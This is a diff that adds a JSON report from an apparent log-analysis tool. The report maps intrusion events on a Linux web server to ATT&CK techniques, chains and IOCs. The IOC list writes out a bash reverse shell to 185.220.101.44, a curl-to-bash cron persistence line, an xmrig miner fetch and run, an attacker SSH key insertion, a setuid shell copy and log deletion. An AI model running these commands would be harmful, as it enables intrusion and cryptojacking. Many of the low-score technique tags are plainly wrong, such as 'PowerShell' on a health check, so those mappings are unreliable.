+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.027355632714602493,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.02688061976759402,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.02454591912701481,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1690",
+          "name": "Prevent Command History Logging",
+          "confidence": "low",
+          "score": 0.023501758173146217,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1087.002",
+          "name": "Domain Account",
+          "confidence": "low",
+          "score": 0.02309835759449679,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548",
+          "name": "Abuse Elevation Control Mechanism",
+          "confidence": "low",
+          "score": 0.022891475096803168,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.002",
+          "name": "Bypass User Account Control",
+          "confidence": "low",
+          "score": 0.02274364659727618,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1136.001",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 19,
+      "ts": "2026-10-06T10:16:20",
+      "host": "web01",
+      "user": "root",
+      "process": "history",
+      "parent_process": "bash",
+      "command_line": "history -c",
+      "command_line_full": "history -c",
+      "message": "clear shell history",
+      "raw": {
+        "@timestamp": "2026-10-06T10:16:20Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "history",
+        "process.parent.name": "bash",
+        "process.command_line": "history -c",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "clear shell history"
+      },
+      "techniques": [
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: history -c"
+        },
+        {
+          "technique": "T1690",
+          "name": "Prevent Command History Logging",
+          "confidence": "low",
+          "score": 0.06404808491843059,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1552.003",
+          "name": "Shell History",
+          "confidence": "low",
+          "score": 0.05917382069377604,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.05046207509485846,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.03687724634086361,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.03299849997418783,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070",
+          "name": "Indicator Removal",
+          "confidence": "low",
+          "score": 0.02883577200389036,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.025968747801347294,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.023050660681996953,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.02052693275887393,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.019460577942291758,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.01901155920545049,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.018599625104505284,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.01768543989097491,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1217",
+          "name": "Browser Information Discovery",
+          "confidence": "low",
+          "score": 0.017026392606463468,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1222.002",
+          "name": "Linux and Mac Permissions",
+          "confidence": "low",
+          "score": 0.01674888756726139,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1505.003",
+          "name": "Web Shell",
+          "confidence": "low",
+          "score": 0.01615572160337121,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685.005",
+          "name": "Clear Windows Event Logs",
+          "confidence": "low",
+          "score": 0.014765407083263982,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.013035951793813108,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.012862078675663509,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1070.003",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 20,
+      "ts": "2026-10-06T10:16:35",
+      "host": "web01",
+      "user": "root",
+      "process": "rm",
+      "parent_process": "bash",
+      "command_line": "rm -f /var/log/auth.log /var/log/nginx/access.log",
+      "command_line_full": "rm -f /var/log/auth.log /var/log/nginx/access.log",
+      "message": "delete logs",
+      "raw": {
+        "@timestamp": "2026-10-06T10:16:35Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "rm",
+        "process.parent.name": "bash",
+        "process.command_line": "rm -f /var/log/auth.log /var/log/nginx/access.log",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "delete logs"
+      },
+      "techniques": [
+        {
+          "technique": "T1685.006",
+          "name": "Clear Linux or Mac System Logs",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: rm -f /var/log/auth.log /var/log/nginx/access.log"
+        },
+        {
+          "technique": "T1685.001",
+          "name": "Disable or Modify Windows Event Log",
+          "confidence": "medium",
+          "score": 0.07015225852838615,
+          "source": "heuristic",
+          "evidence": "KB search match on: rm -f /var/log/auth.log /var/log/nginx/access.log"
+        },
+        {
+          "technique": "T1552.001",
+          "name": "Credentials In Files",
+          "confidence": "medium",
+          "score": 0.05806146418123928,
+          "source": "heuristic",
+          "evidence": "KB search match on: rm -f /var/log/auth.log /var/log/nginx/access.log"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.050728167861802856,
+          "source": "heuristic",
+          "evidence": "KB search match on: rm -f /var/log/auth.log /var/log/nginx/access.log"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "medium",
+          "score": 0.046138833792215055,
+          "source": "heuristic",
+          "evidence": "KB search match on: rm -f /var/log/auth.log /var/log/nginx/access.log"
+        },
+        {
+          "technique": "T1070.004",
+          "name": "File Deletion",
+          "confidence": "low",
+          "score": 0.06829716556792466,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.05603993026483835,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.04991404551532821,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685.002",
+          "name": "Disable or Modify Cloud Log",
+          "confidence": "low",
+          "score": 0.04889549508824064,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.04318920954043944,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.039240889726180575,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.03904798443419692,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070",
+          "name": "Indicator Removal",
+          "confidence": "low",
+          "score": 0.03841604052133241,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685.005",
+          "name": "Clear Windows Event Logs",
+          "confidence": "low",
+          "score": 0.02887387920185182,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1490",
+          "name": "Inhibit System Recovery",
+          "confidence": "low",
+          "score": 0.02756510203259745,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.023078213822944033,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.023068935061152915,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1505.003",
+          "name": "Web Shell",
+          "confidence": "low",
+          "score": 0.021960696824189545,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.02153859952833497,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.019939231120235004,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1685.006",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 21,
+      "ts": "2026-10-06T10:18:00",
+      "host": "gw-check",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health HTTP/1.1 200",
+      "command_line_full": "GET /health HTTP/1.1 200",
+      "message": "GET /health HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T10:18:00Z",
+        "host.name": "gw-check",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /health HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9970059965168873,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.7315900231926635,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5088509093256618,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.49930759167481054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48586605523874615,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.4332230393758367,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.4134348049896432,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.32546526532866504,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.30259170781157146,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.2806988143660321,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.25410435038010204,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "low",
+          "score": 0.21329952840839186,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.21062074231919156,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.17828422752458498,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.1693799128996166,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.16905773123120293,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.16871398283697447,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.16674752985476557,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.16585874378011503,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    }
+  ],
+  "chains": [
+    {
+      "id": 1,
+      "host": "gw-check",
+      "user": "checker",
+      "start": "2026-10-06T09:58:00",
+      "end": "2026-10-06T10:18:00",
+      "events": [
+        0,
+        4,
+        13,
+        17,
+        21
+      ],
+      "tactics": [
+        "initial-access",
+        "defense-impairment",
+        "persistence",
+        "execution",
+        "stealth"
+      ],
+      "techniques": [
+        "T1190",
+        "T1112",
+        "T1059.001",
+        "T1685",
+        "T1574.001",
+        "T1218",
+        "T1003.001",
+        "T1105",
+        "T1027",
+        "T1204.002",
+        "T1082",
+        "T1059",
+        "T1047",
+        "T1071.001",
+        "T1218.011",
+        "T1059.003",
+        "T1219.002",
+        "T1003",
+        "T1547.001",
+        "T1543.003"
+      ]
+    },
+    {
+      "id": 2,
+      "host": "web01",
+      "user": "www-data",
+      "start": "2026-10-06T10:00:12",
+      "end": "2026-10-06T10:16:35",
+      "events": [
+        1,
+        2,
+        3,
+        5,
+        6,
+        7,
+        8,
+        9,
+        10,
+        11,
+        12,
+        14,
+        15,
+        16,
+        18,
+        19,
+        20
+      ],
+      "tactics": [
+        "initial-access",
+        "defense-impairment",
+        "persistence",
+        "execution",
+        "stealth",
+        "command-and-control",
+        "credential-access",
+        "privilege-escalation",
+        "impact"
+      ],
+      "techniques": [
+        "T1190",
+        "T1112",
+        "T1059.001",
+        "T1685",
+        "T1574.001",
+        "T1218",
+        "T1105",
+        "T1059",
+        "T1027",
+        "T1047",
+        "T1003.001",
+        "T1055",
+        "T1204.002",
+        "T1098",
+        "T1560.001",
+        "T1082",
+        "T1003",
+        "T1547.001",
+        "T1053.005",
+        "T1218.011",
+        "T1505.003",
+        "T1552.001",
+        "T1059.004",
+        "T1059.003",
+        "T1071.001",
+        "T1021.002",
+        "T1555.003",
+        "T1572",
+        "T1140",
+        "T1070.003",
+        "T1546.005",
+        "T1564.004",
+        "T1018",
+        "T1033",
+        "T1518.001",
+        "T1087.001",
+        "T1057",
+        "T1083",
+        "T1049",
+        "T1007",
+        "T1069.001",
+        "T1016",
+        "T1195.002",
+        "T1003.008",
+        "T1078.003",
+        "T1201",
+        "T1552.003",
+        "T1217",
+        "T1136.001",
+        "T1552.004",
+        "T1069.002",
+        "T1005",
+        "T1056.001",
+        "T1070.008",
+        "T1027.002",
+        "T1036.003",
+        "T1543.001",
+        "T1548.001",
+        "T1036",
+        "T1115",
+        "T1222.002",
+        "T1098.004",
+        "T1553.004",
+        "T1021.004",
+        "T1078",
+        "T1110.004",
+        "T1021",
+        "T1113",
+        "T1053.003",
+        "T1110.001",
+        "T1543.002",
+        "T1496",
+        "T1219.002",
+        "T1197",
+        "T1686",
+        "T1543.003",
+        "T1690",
+        "T1087.002",
+        "T1548",
+        "T1548.002",
+        "T1070",
+        "T1685.005",
+        "T1685.006",
+        "T1685.001",
+        "T1070.004",
+        "T1685.002",
+        "T1490"
+      ]
+    }
+  ],
+  "iocs": [
+    {
+      "type": "ip",
+      "value": "172.16.9.9",
+      "count": 5,
+      "first": "2026-10-06T09:58:00",
+      "last": "2026-10-06T10:18:00"
+    },
+    {
+      "type": "ip",
+      "value": "10.20.0.10",
+      "count": 8,
+      "first": "2026-10-06T09:58:00",
+      "last": "2026-10-06T10:18:00"
+    },
+    {
+      "type": "ip",
+      "value": "185.220.101.44",
+      "count": 3,
+      "first": "2026-10-06T10:00:12",
+      "last": "2026-10-06T10:02:05"
+    },
+    {
+      "type": "unix_path",
+      "value": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1",
+      "count": 1,
+      "first": "2026-10-06T10:03:20",
+      "last": "2026-10-06T10:03:20"
+    },
+    {
+      "type": "unix_path",
+      "value": "cat /etc/passwd",
+      "count": 1,
+      "first": "2026-10-06T10:03:58",
+      "last": "2026-10-06T10:03:58"
+    },
+    {
+      "type": "unix_path",
+      "value": "find / -perm -4000 -type f",
+      "count": 1,
+      "first": "2026-10-06T10:05:10",
+      "last": "2026-10-06T10:05:10"
+    },
+    {
+      "type": "unix_path",
+      "value": "cp /bin/bash /tmp/rootbash",
+      "count": 1,
+      "first": "2026-10-06T10:06:22",
+      "last": "2026-10-06T10:06:22"
+    },
+    {
+      "type": "unix_path",
+      "value": "chmod u+s /tmp/rootbash",
+      "count": 1,
+      "first": "2026-10-06T10:06:24",
+      "last": "2026-10-06T10:06:24"
+    },
+    {
+      "type": "unix_path",
+      "value": "echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >> /root/.ssh/authorized_keys",
+      "count": 1,
+      "first": "2026-10-06T10:07:50",
+      "last": "2026-10-06T10:07:50"
+    },
+    {
+      "type": "unix_path",
+      "value": "crontab -l ; echo '* * * * * curl -s http://185.220.101.44/x.sh | bash' | crontab -",
+      "count": 1,
+      "first": "2026-10-06T10:09:05",
+      "last": "2026-10-06T10:09:05"
+    },
+    {
+      "type": "unix_path",
+      "value": "curl -O http://185.220.101.44/xmrig",
+      "count": 1,
+      "first": "2026-10-06T10:11:30",
+      "last": "2026-10-06T10:11:30"
+    },
+    {
+      "type": "unix_path",
+      "value": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333 -u wallet --donate-level 0",
+      "count": 1,
+      "first": "2026-10-06T10:12:10",
+      "last": "2026-10-06T10:12:10"
+    },
+    {
+      "type": "unix_path",
+      "value": "rm -f /var/log/auth.log /var/log/nginx/access.log",
+      "count": 1,
+      "first": "2026-10-06T10:16:35",
+      "last": "2026-10-06T10:16:35"
+    }
+  ],
+  "coverage": [
+    {
+      "shortname": "reconnaissance",
+      "name": "Reconnaissance",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "resource-development",
+      "name": "Resource Development",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "initial-access",
+      "name": "Initial Access",
+      "observed": [
+        "T1190"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "execution",
+      "name": "Execution",
+      "observed": [
+        "T1047",
+        "T1053.003",
+        "T1059.004",
+        "T1059",
+        "T1574.001",
+        "T1059.001"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "persistence",
+      "name": "Persistence",
+      "observed": [
+        "T1505.003",
+        "T1053.003",
+        "T1098.004",
+        "T1136.001",
+        "T1112"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "privilege-escalation",
+      "name": "Privilege Escalation",
+      "observed": [
+        "T1055",
+        "T1053.003",
+        "T1548.001",
+        "T1098.004"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "stealth",
+      "name": "Stealth",
+      "observed": [
+        "T1027",
+        "T1574.001",
+        "T1055",
+        "T1070.003",
+        "T1218"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "defense-impairment",
+      "name": "Defense Impairment",
+      "observed": [
+        "T1553.004",
+        "T1685.006",
+        "T1685",
+        "T1685.001",
+        "T1112"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "credential-access",
+      "name": "Credential Access",
+      "observed": [
+        "T1003.001",
+        "T1552.001",
+        "T1003.008"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "discovery",
+      "name": "Discovery",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "lateral-movement",
+      "name": "Lateral Movement",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "collection",
+      "name": "Collection",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "command-and-control",
+      "name": "Command and Control",
+      "observed": [
+        "T1105"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "exfiltration",
+      "name": "Exfiltration",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "impact",
+      "name": "Impact",
+      "observed": [
+        "T1496"
+      ],
+      "missing": false
+    }
+  ],
+  "checkers": [
+    {
+      "src": "172.16.9.9",
+      "dst": "10.20.0.10",
+      "key": "172.16.9.9 -> 10.20.0.10 ()",
+      "count": 5,
+      "interval_seconds": 300.0,
+      "first": "2026-10-06T09:58:00",
+      "last": "2026-10-06T10:18:00",
+      "sample_evidence": "davriy \u2014 checker yoki C2 beacon bo'lishi mumkin"
+    }
+  ]
+}
